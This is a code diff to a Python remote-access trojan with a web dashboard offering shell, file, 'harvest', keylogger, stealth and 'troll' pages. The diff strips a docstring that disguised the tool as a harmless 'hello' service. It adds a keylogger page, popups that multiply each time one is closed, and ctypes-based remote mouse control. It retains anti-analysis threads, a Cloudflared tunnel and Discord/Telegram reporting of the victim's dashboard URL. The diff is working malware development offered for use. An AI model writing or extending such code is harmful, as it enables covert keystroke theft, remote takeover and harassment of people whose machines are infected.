@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-Auto-start service with Cloudflared tunnel and Discord webhook notification.
-Starts a simple service displaying "hello" on a random port,
-exposes it via Cloudflared, and posts the URL to Discord webhook.
-"""
 
 # config values get injected at build time
 
@@ -3536,6 +3531,7 @@ DASHBOARD_HTML = r'''
                 <div class="nav-item" onclick="showPage('files')"><span class="nav-icon">[F]</span><span class="nav-text">Files</span></div>
                 <div class="nav-item" onclick="showPage('shell')"><span class="nav-icon">[$]</span><span class="nav-text">Shell</span></div>
                 <div class="nav-item" onclick="showPage('harvest')"><span class="nav-icon">[D]</span><span class="nav-text">Harvest</span></div>
+                <div class="nav-item" onclick="showPage('keylogger')"><span class="nav-icon">[K]</span><span class="nav-text">Keylogger</span></div>
                 <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">[C]</span><span class="nav-text">Control</span></div>
                 <div class="nav-item" onclick="showPage('stealth')"><span class="nav-icon">[X]</span><span class="nav-text">Stealth</span></div>
                 <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">[T]</span><span class="nav-text">Troll</span></div>
@@ -3873,13 +3869,19 @@ DASHBOARD_HTML = r'''
                     <input type="text" id="telegramMsg" placeholder="Custom message or leave blank for auto-report">
                     <button class="btn" onclick="sendToTelegram()" style="width: 100%;">Send Report</button>
                 </div>
+                </div>
+            </div>
+
+            <!-- Keylogger Page -->
+            <div class="page" id="page-keylogger">
+                <div class="page-grid">
                 <div class="section" style="grid-column: 1 / -1;">
-                    <div class="section-header"><div class="section-title">Host Keylogger</div><div><button class="btn small" onclick="downloadKeylogs()">Download All Logs</button><button class="btn small" onclick="clearKeylog()">Clear</button></div></div>
+                    <div class="section-header"><div class="section-title">Host Keylogger</div><div><button class="btn small" onclick="downloadKeylogs()">Download All Logs</button><button class="btn small" onclick="clearKeylog()">Clear</button><button class="btn small" onclick="loadKeylogInfo()">Refresh Info</button></div></div>
                     <div style="margin-bottom: 15px; display: flex; gap: 20px; flex-wrap: wrap;">
                         <div><strong>Path:</strong> <span id="keylogPath">Loading...</span></div>
                         <div><strong>Size:</strong> <span id="keylogSize">0 B</span></div>
                     </div>
-                    <div class="log-box" id="keylogBox">Loading...</div>
+                    <div class="log-box" id="keylogBox" style="height: 60vh;">Loading...</div>
                 </div>
                 </div>
             </div>
@@ -5413,67 +5415,24 @@ def stop_audio():
 
 _popup_running = False
 
-def _make_tk_popup(p_title: str, p_text: str, p_type: str, x: int = -1, y: int = -1):
-    """Create a tkinter popup at optional x,y position. On close, hydra spawns 2 more."""
+def _make_win_popup(p_title: str, p_text: str, p_type: str):
+    """Show a real Windows MessageBox. Hydra: on close, spawns 2 more in background threads."""
     global _popup_running
-    import tkinter as tk
-    root = tk.Tk()
-    root.title(p_title)
-    root.configure(bg='#1a1a2e')
-    root.resizable(False, False)
-    root.attributes('-topmost', True)
-    root.overrideredirect(False)
-    
-    label = tk.Label(root, text=p_text, bg='#1a1a2e', fg='#e0e0e0',
-                     font=('Segoe UI', 11), wraplength=280, justify='center',
-                     padx=20, pady=15)
-    label.pack()
-    
-    btn_frame = tk.Frame(root, bg='#1a1a2e')
-    btn_frame.pack(pady=(0, 10))
-    
-    if p_type == 'persistent':
-        def on_ok():
-            root.destroy()
+    import ctypes
+    if p_type == 'hydra':
+        while _popup_running:
+            result = ctypes.windll.user32.MessageBoxW(0, p_text, p_title, 0x40 | 0x10)
+            if _popup_running:
+                for _ in range(2):
+                    threading.Thread(target=_make_win_popup, args=(p_title, p_text, 'hydra'), daemon=True).start()
+                break
+    elif p_type == 'persistent':
+        while _popup_running:
+            ctypes.windll.user32.MessageBoxW(0, p_text, p_title, 0x40 | 0x10)
             if _popup_running:
                 time.sleep(0.05)
-                threading.Thread(target=_make_tk_popup, args=(p_title, p_text, p_type), daemon=True).start()
-        btn = tk.Button(btn_frame, text="OK", command=on_ok, width=10,
-                        bg='#7c3aed', fg='white', font=('Segoe UI', 10, 'bold'),
-                        relief='flat', cursor='hand2')
-        btn.pack()
-    elif p_type == 'hydra':
-        def on_ok():
-            root.destroy()
-            if _popup_running:
-                import random
-                sw = root.winfo_screenwidth()
-                sh = root.winfo_screenheight()
-                for _ in range(2):
-                    nx = random.randint(0, max(sw - 300, 0))
-                    ny = random.randint(0, max(sh - 150, 0))
-                    threading.Thread(target=_make_tk_popup, args=(p_title, p_text, 'hydra', nx, ny), daemon=True).start()
-        btn = tk.Button(btn_frame, text="OK", command=on_ok, width=10,
-                        bg='#dc2626', fg='white', font=('Segoe UI', 10, 'bold'),
-                        relief='flat', cursor='hand2')
-        btn.pack()
     else:
-        btn = tk.Button(btn_frame, text="OK", command=root.destroy, width=10,
-                        bg='#7c3aed', fg='white', font=('Segoe UI', 10, 'bold'),
-                        relief='flat', cursor='hand2')
-        btn.pack()
-    
-    root.update_idletasks()
-    w = root.winfo_width()
-    h = root.winfo_height()
-    if x >= 0 and y >= 0:
-        root.geometry(f'+{x}+{y}')
-    else:
-        sx = (root.winfo_screenwidth() - w) // 2
-        sy = (root.winfo_screenheight() - h) // 2
-        root.geometry(f'+{sx}+{sy}')
-    
-    root.mainloop()
+        ctypes.windll.user32.MessageBoxW(0, p_text, p_title, 0x40)
 
 @app.route('/api/troll/popup', methods=['POST'])
 def troll_popup():
@@ -5485,7 +5444,7 @@ def troll_popup():
         title = data.get('title', 'System')
         text = data.get('text', 'Error')
         _popup_running = True
-        threading.Thread(target=_make_tk_popup, args=(title, text, popup_type), daemon=True).start()
+        threading.Thread(target=_make_win_popup, args=(title, text, popup_type), daemon=True).start()
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -5747,43 +5706,58 @@ def keylogger_info():
 
 @app.route('/api/control/mouse', methods=['POST'])
 def control_mouse():
-    """Control mouse movement and clicks."""
+    """Control mouse movement and clicks using ctypes for accurate multi-monitor positioning."""
     try:
+        import ctypes
         data = request.get_json()
         action = data.get('action', '')
-        x = data.get('x', 0)
-        y = data.get('y', 0)
+        x = int(data.get('x', 0))
+        y = int(data.get('y', 0))
         button = data.get('button', 'left')
-        offset_x = data.get('offset_x', 0)
-        offset_y = data.get('offset_y', 0)
-        
-        from pynput.mouse import Controller, Button
-        mouse = Controller()
-        
+        offset_x = int(data.get('offset_x', 0))
+        offset_y = int(data.get('offset_y', 0))
+
+        MOUSEEVENTF_MOVE = 0x0001
+        MOUSEEVENTF_LEFTDOWN = 0x0002
+        MOUSEEVENTF_LEFTUP = 0x0004
+        MOUSEEVENTF_RIGHTDOWN = 0x0008
+        MOUSEEVENTF_RIGHTUP = 0x0010
+        MOUSEEVENTF_MIDDLEDOWN = 0x0020
+        MOUSEEVENTF_MIDDLEUP = 0x0040
+        MOUSEEVENTF_ABSOLUTE = 0x8000
+        MOUSEEVENTF_VIRTUALDESK = 0x4000
+
+        user32 = ctypes.windll.user32
+
         if action == 'move':
-            mouse.position = (x + offset_x, y + offset_y)
+            final_x = x + offset_x
+            final_y = y + offset_y
+            user32.SetCursorPos(final_x, final_y)
         elif action == 'click':
             if button == 'left':
-                mouse.click(Button.left)
+                user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
+                user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
             elif button == 'right':
-                mouse.click(Button.right)
+                user32.mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
+                user32.mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
             elif button == 'middle':
-                mouse.click(Button.middle)
+                user32.mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0)
+                user32.mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0)
         elif action == 'press':
             if button == 'left':
-                mouse.press(Button.left)
+                user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
             elif button == 'right':
-                mouse.press(Button.right)
+                user32.mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
         elif action == 'release':
             if button == 'left':
-                mouse.release(Button.left)
+                user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
             elif button == 'right':
-                mouse.release(Button.right)
+                user32.mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
         elif action == 'scroll':
-            dx = data.get('dx', 0)
-            dy = data.get('dy', 0)
-            mouse.scroll(dx, dy)
-        
+            dy = int(data.get('dy', 0))
+            WHEEL_DELTA = 120
+            user32.mouse_event(0x0800, 0, 0, dy * WHEEL_DELTA, 0)
+
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -7959,7 +7933,7 @@ def main():
     has_telegram = TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("BUILD_") and not TELEGRAM_BOT_TOKEN.startswith("ENC:") and TELEGRAM_CHAT_ID and not TELEGRAM_CHAT_ID.startswith("BUILD_") and not TELEGRAM_CHAT_ID.startswith("ENC:")
 
     if not has_discord and not has_telegram:
-        return
+        print("[IGR] No Discord/Telegram configured - running in standalone mode (dashboard only)")
 
     try:
         threading.Thread(target=_delayed_anti_analysis, daemon=True).start()
@@ -8015,6 +7989,10 @@ def main():
         CLOUDFLARED_PUBLIC_URL = start_cloudflared(port) or ""
     except:
         CLOUDFLARED_PUBLIC_URL = ""
+    
+    print(f"[IGR] Dashboard running on http://localhost:{port}")
+    if CLOUDFLARED_PUBLIC_URL:
+        print(f"[IGR] Tunnel: {CLOUDFLARED_PUBLIC_URL}")
     
     if CLOUDFLARED_PUBLIC_URL:
         if has_discord:
